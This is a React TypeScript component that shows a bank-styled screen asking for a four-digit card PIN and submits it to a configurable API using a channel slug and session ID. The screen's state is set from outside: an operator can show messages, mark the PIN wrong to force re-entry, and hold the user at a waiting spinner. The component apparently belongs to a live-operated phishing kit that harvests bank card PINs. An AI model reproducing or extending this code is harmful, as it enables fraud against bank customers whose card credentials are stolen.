import React, { useState, useEffect } from "react";
import { PinInput } from "../../components/pin-input";
import { submitOtp } from "../../lib/bank-api";
import type { OperatorMessage as OperatorMessageType } from "../../types";
import { Spinner } from "../../components/spinner";

interface PinEntryProps {
  apiBase: string;
  channelSlug: string;
  sessionId: string;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
}

export function PinEntry({
  apiBase,
  channelSlug,
  sessionId,
  onError,
  wrongCode,
  onTryAgain,
  operatorMessage,
}: PinEntryProps) {
  const [submitting, setSubmitting] = useState(false);
  const [resetKey, setResetKey] = useState(0);

  useEffect(() => {
    if (wrongCode) {
      setSubmitting(false);
      setResetKey((k) => k + 1);
    }
  }, [wrongCode]);

  const handleComplete = async (pin: string) => {
    onTryAgain?.();
    setSubmitting(true);
    try {
      await submitOtp(apiBase, channelSlug, sessionId, pin);
    } catch (e) {
      onError(e instanceof Error ? e.message : "Invalid PIN");
      setSubmitting(false);
    }
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  return (
    <div className="bank-ui-layout">
      {wrongCode && (
        <div className="bank-ui-alert">
          <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
        </div>
      )}
      <h2 className="bank-ui-heading">Enter your PIN</h2>
      <p className="bank-ui-body">
        Enter the PIN for your card to complete the transaction.
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <PinInput
        key={resetKey}
        digits={4}
        onComplete={handleComplete}
        disabled={submitting}
      />
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
